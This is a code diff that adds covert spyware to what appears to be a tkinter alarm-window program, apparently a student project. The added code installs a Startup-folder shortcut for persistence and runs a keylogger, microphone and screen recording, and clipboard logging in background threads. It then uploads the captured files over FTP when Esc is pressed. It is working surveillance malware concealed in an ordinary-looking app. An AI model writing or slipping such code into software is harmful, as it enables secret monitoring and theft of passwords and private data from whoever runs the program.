@@ -4,6 +4,19 @@ from __future__ import division
 import sys
 import time
 import os
+from pynput.keyboard import Key, Listener
+from ftplib import FTP
+import pyaudio
+import wave
+import cv2
+import numpy as np
+import pyautogui
+import time
+import pyperclip
+import threading
+import winreg as reg
+import os
+import win32com.client
 try:
     import tkinter
 except ImportError:
@@ -23,6 +36,19 @@ if sys.version_info[:2] < (3, 3):
 
 # absolute script directory path
 abs_dir = os.path.dirname(os.path.abspath(__file__))
+
+startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+
+script_path = os.path.abspath(__file__)
+
+shortcut_path = os.path.join(startup_folder, 'SpyShortcut.lnk')
+shell = win32com.client.Dispatch('WScript.Shell')
+shortcut = shell.CreateShortCut(shortcut_path)
+shortcut.TargetPath = script_path #"C:/Users/mcsco/Desktop/Senior_Project/project-repository-MarcusScott483/spy.py" #maybe needs to be script_path, add .exe instead of .py ?
+shortcut.WorkingDirectory = os.path.dirname(script_path)
+shortcut.Save()
+
+logfile = open("keylog.txt", "w")
 
 
 class AlarmWin(object):
@@ -190,5 +216,130 @@ class AlarmWin(object):
         self._place_window()
         self._root.mainloop()
 
+def pressed(key):
+    try:
+        print('Key {} pressed.'.format(key))
+        logfile.write(str(key))
+    except AttributeError:
+        print('Special key {} pressed.'.format(key))
+
+def released(key):
+    print('Key {} released.'.format(key))
+    if key == Key.esc:
+        print("keystroke capture stopped, uploading to FTP server")
+        logfile.close()
+        ftp = FTP("localhost", "username", "password")
+        with open("keylog.txt", "rb") as f:
+            ftp.storbinary(f"STOR logfile.txt", f)
+
+        with open("audioRecording.wav", "rb") as wav:
+            ftp.storbinary("STOR audioRecording.wav", wav)
+
+        with open("screenRecording.mp4", "rb") as vid:
+            ftp.storbinary("STOR screenRecording.mp4", vid)
+
+        with open("clipboardLog.txt", "rb") as cb:
+            ftp.storbinary("STOR clipboardLog.txt", cb)
+
+        ftp.quit()
+
+        return False
+
+
+def audioWorker(): 
+
+    audio = pyaudio.PyAudio()
+    stream = audio.open(format=pyaudio.paInt16, channels=1,
+                    rate=44100, input=True,
+                    frames_per_buffer=1024)
+    print("recording audio")
+
+    frames = []
+    for i in range(0, int(44100 / 1024 * 5)):
+        data = stream.read(1024)
+        frames.append(data)
+
+    print("audio recording stopped")
+
+    stream.stop_stream()
+    stream.close()
+    audio.terminate()
+
+    wf = wave.open("audioRecording.wav", 'wb')
+    wf.setnchannels(1)
+    wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
+    wf.setframerate(44100)
+    wf.writeframes(b''.join(frames))
+    wf.close()
+
+def screenWorker():
+    print("recording screen")
+    screenSize = (1920, 1080)
+
+    out = cv2.VideoWriter("screenRecording.mp4", cv2.VideoWriter_fourcc(*"mp4v"), 25, screenSize)
+
+    startTime = time.monotonic()
+    timeLimit = 3
+
+    while time.monotonic() - startTime < timeLimit:
+        screenshot = pyautogui.screenshot()
+        frame = np.array(screenshot)
+
+        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        out.write(frame)
+    
+    print("screen recording stopped")
+
+    out.release()
+    cv2.destroyAllWindows()
+
+
+def clipboardWorker():
+
+    startTime = time.monotonic()
+    timeLimit = 15
+
+    stop_flag = False
+
+    print("capturing clipboard")
+    duration = 10 
+    start_time = time.time()
+
+    previous_clipboard = ""
+
+    stop_flag = False
+
+    while not stop_flag:
+        current_clipboard = pyperclip.paste()
+        if current_clipboard != previous_clipboard:
+            with open("clipboardLog.txt", "a") as f:
+                f.write(current_clipboard + "\n")
+            previous_clipboard = current_clipboard
+        elapsed_time = time.time() - start_time
+        if elapsed_time >= duration:
+            stop_flag = True
+        time.sleep(0.1)
+
+    print("clipboard capture stopped")
+
+def keyloggerWorker():
+    print("capturing keystrokes")
+    with Listener(on_press=pressed, on_release=released) as listener:
+        listener.join()
+
+audioThread = threading.Thread(target=audioWorker)
+screenThread = threading.Thread(target=screenWorker)
+clipboardThread = threading.Thread(target=clipboardWorker)
+keyloggerThread = threading.Thread(target=keyloggerWorker)
+
+audioThread.start()
+screenThread.start()
+clipboardThread.start()
+keyloggerThread.start()
 
 AlarmWin().mainloop()
+
+audioThread.join()
+screenThread.join()
+clipboardThread.join()
+keyloggerThread.join()
